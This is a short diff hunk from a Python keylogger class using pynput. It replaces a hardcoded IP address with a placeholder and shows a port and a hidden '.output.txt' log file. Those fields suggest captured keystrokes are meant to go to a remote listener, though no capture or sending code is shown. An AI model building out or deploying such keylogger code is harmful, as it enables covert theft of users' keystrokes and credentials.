@@ -4,7 +4,7 @@ from pynput import keyboard
 class KeyLogger:
 
     def __init__(self) -> None:
-        self.ip = "192.168.1.159"
+        self.ip = "<IP>"
         self.port = 1234
         self.output = os.path.join(os.getcwd(),".output.txt")
 
